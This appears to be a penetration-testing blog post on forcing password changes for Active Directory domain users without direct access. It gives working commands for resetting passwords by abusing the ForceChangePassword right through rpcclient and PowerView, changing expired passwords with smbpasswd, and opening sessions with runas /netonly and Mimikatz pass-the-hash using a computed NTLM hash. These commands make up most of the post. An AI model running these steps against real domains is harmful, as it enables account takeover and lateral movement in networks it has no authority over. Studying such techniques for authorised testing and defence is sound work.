[back](/)

<div class="block1"> <img src="/img/hat.jpg"></div>

### Your password has expired

During penetration testing Active Directory you often encounter the need to change the password for domain users. How to do this if you do not have direct access to control? for example by winrm, rdp or wmi.

Here are some useful examples that I've collected as a result of my work:

Example 1: you have a domain user whose password has expired (or a temporary password has been set), in which case you will not be able to connect under the current user due to NLA (Network Level Authentication). By using the NetApi32 function you can easily change the password without a direct connection, in this article you will find the script: https://hinchley.net/articles/changing-your-expired-active-directory-password-via-powershell/

Example 2: you have a domain user with the "ForceChangePassword" attribute, in which case you do not need to know the current user's password and you can use the rpcclient utility as follows:

```
setuserinfo2 yourusername 23 'yourpassword'
```

![Image](/img/domain-user-password/1.png)
![Image](/img/domain-user-password/2.png)

![Image](/img/domain-user-password/3.png)

Example 3: you have a domain user with an expired password and access to the smb service, then you can change the password using smbpasswd like this:

```
smbpasswd -r HOST -U yourusername
```

Also, if you have an active account in the domain, you can run commands from the cmd/powershell console:

```
runas / netonly /U:yourusername@yourdomain powershell
```

this way you will open a session as a domain user

![Image](/img/domain-user-password/5.png)

or using mimikatz having previously generated the NTLM hash:

```
echo -n "password" | iconv -t UTF-16LE | openssl md4
privilege :: debug
token :: elevate
pth /user:yourusername /domain:yourdomain / ntlm: NTLM /run:"powershell.exe"
```

![Image](/img/domain-user-password/4.png)

Then, in an open session use PowerView.ps1 (if you need to change the password using the previous one)

```
$ SecPassword = ConvertTo-SecureString 'yourpassword' -AsPlainText -Force
$ Cred = New-Object System.Management.Automation.PSCredential ('yourdomain\yourusername', $SecPassword)
$ UserPassword = ConvertTo-SecureString 'yourpassword' -AsPlainText -Force
Set-DomainUserPassword -Identity yourusername -AccountPassword $UserPassword -Credential $Cred
```

or (if you need to change the password without knowing the previous one, if the ForceChangePassword attribute is present)

```
$pw = Convertto-securestring 'yourpassword' -asplaintext -force
Set-DomainUserPassword -Domain yourdomain -Identity 'CN=yourusername,CN=Users,DC=yourdomain,DC=yourdomain' -accountpassword $pw
```

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

<style type="text/css">
 .block1 { 
  font-family: Lucida Console, Courier, monospace;
  font-size: small;
  text-align: center;
   } 
</style>

[back](/)


